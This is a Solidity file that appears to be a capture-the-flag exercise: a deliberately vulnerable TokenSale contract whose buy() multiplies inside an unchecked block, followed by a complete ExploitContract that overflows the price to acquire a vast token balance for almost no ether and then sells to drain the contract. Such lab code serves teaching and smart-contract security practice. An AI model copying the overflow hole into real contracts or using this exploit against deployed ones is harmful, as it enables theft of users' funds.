// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import { console } from 'forge-std/console.sol';

contract TokenSale {
  mapping(address => uint256) public balanceOf;
  uint256 constant PRICE_PER_TOKEN = 1 ether;

  constructor() payable {
    require(msg.value == 1 ether, 'Requires 1 ether to deploy contract');
  }

  function isComplete() public view returns (bool) {
    return address(this).balance < 1 ether;
  }

  function buy(uint256 numTokens) public payable returns (uint256) {
    uint256 total = 0;
    unchecked {
      total += numTokens * PRICE_PER_TOKEN;
    }

    require(msg.value == total);

    balanceOf[msg.sender] += numTokens;
    return (total);
  }

  function sell(uint256 numTokens) public {
    require(balanceOf[msg.sender] >= numTokens);

    balanceOf[msg.sender] -= numTokens;
    (bool ok, ) = msg.sender.call{ value: (numTokens * PRICE_PER_TOKEN) }('');
    require(ok, 'Transfer to msg.sender failed');
  }
}

// Write your exploit contract below
contract ExploitContract {
  TokenSale public tokenSale;

  constructor(TokenSale _tokenSale) {
    tokenSale = _tokenSale;
  }

  receive() external payable {}
  // write your exploit functions below

  function buyTokens() public {
    uint256 pricePerToken = 1 ether;
    uint256 maxUint256 = type(uint256).max;

    uint256 numTokens = (maxUint256 / pricePerToken) + 1;
    uint256 amountEther;

    unchecked {
      amountEther = numTokens * pricePerToken;
    }

    tokenSale.buy{ value: amountEther }(numTokens);
  }

  function sellTokens() public {
    tokenSale.sell(1);
  }
}
